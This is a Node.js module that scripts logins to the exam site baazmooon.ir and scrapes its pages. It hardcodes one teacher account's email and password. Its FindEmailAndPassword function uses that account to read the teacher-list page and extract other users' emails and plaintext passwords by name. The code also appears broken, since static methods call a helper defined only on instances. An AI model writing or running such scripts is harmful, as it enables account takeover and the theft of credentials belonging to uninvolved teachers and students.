const { JSDOM } = require("jsdom");
const superagent = require("superagent");

class User {
  //Constructor for Get User Coockie
  constructor() {
    this.Get_Coockie = async function GetCoockie() {
      var Response = await superagent.post(
        "http://baazmooon.ir/signup_sub.php"
      );
      return await Response.headers["set-cookie"][0].split(";")[0];
    };
  }

  //Login on Fallah Account
  //isTeacher = is user is teacher change false if User is Student must true
  static async Login(email, password, isTeacher = false, callback) {
    const coockie = await this.Get_Coockie();
    const usr = isTeacher ? "2" : "1";
    var Response = await superagent
      .post("http://baazmooon.ir/signin_sub.php")
      .set(
        "Accept",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
      )
      .set(
        "Accept-Language",
        "fa-IR,fa;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6,zh;q=0.5"
      )
      .set("Cache-Control", "max-age=0")
      .set("Connection", "keep-alive")
      .set("Cookie", coockie)
      .set("Origin", "http://baazmooon.ir")
      .set("Referer", "http://baazmooon.ir/thbt.php")
      .set("Upgrade-Insecure-Requests", "1")
      .type("form")
      .send({
        email: email,
        pass: password,
        usr: usr,
      });

    const dom = new JSDOM(Response.text);
    const tags = dom.window.document.querySelector("ul");
    const Name = tags.textContent.match(/\(\w.+\)/);
    if (Name != null) {
      callback(Name[0], coockie);
    } else {
      callback("Faild To Login please Check Email or password");
    }
  }

  //Find email And Password
  static async FindEmailAndPassword(name, callback) {
    this.Login("fallah@aram.khd", "12345608", true, async (Name, coockie) => {
      const Response = await superagent
        .get("http://baazmooon.ir/listteacher.php")
        .set(
          "Accept",
          "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
        )
        .set(
          "Accept-Language",
          "fa-IR,fa;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6,zh;q=0.5"
        )
        .set("Connection", "keep-alive")
        .set("Referer", "http://baazmooon.ir/index.php")
        .set("Upgrade-Insecure-Requests", "1")
        .set("Cookie", coockie);
      const dom = new JSDOM(Response.text);
      const html = await dom.window.document.querySelectorAll("td");
      for (let n = 1; n < html.length; n += 6) {
        if (html[n].textContent.startsWith(name)) {
          const email = html[n + 1].textContent;
          const pass = html[n + 2].textContent.slice(1, -1);
          const result = {};
          result["email"] = email;
          result["pass"] = pass;
          callback(result);
        }
      }
    });
  }

  //Azmoon
  static async Azmon(course, pdmn) {
    return null;
  }
}

module.exports = User;
